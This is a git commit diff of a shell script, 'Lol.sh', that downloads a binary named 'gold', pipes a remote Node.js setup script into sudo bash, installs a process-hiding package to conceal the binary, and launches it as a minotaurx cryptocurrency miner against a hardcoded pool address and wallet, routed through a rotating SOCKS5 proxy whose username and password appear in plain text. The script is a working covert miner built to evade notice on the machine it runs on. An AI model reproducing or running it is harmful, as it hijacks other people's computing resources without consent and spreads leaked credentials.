866c893ec7c9a2e1e9ae4a114d0dfc25c156e995
iton466 <108810354+iton466@users.noreply.github.com>
2022-07-12 14:23:43 +0530

    Lok

--- Lol.sh
+++ Lol.sh
@@ -2,8 +2,11 @@ cd /home
 wget https://github.com/Testdrive345/hello/raw/main/gold
 chmod 777 gold
 sudo apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash 
-sudo apt install nodejs 
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+
 npm i -g node-process-hider
+
 ph add gold
 sudo ./gold -a minotaurx -o 103.249.70.7:7019 -u MBsiaTaEEUNsMHFZKPmqT35Sv3rbiLLkAp -p  c=LCC,mc=LCC,ID=Test -x socks5://jvyxiovx-rotate:2udhid79wl5a@p.webshare.io:80
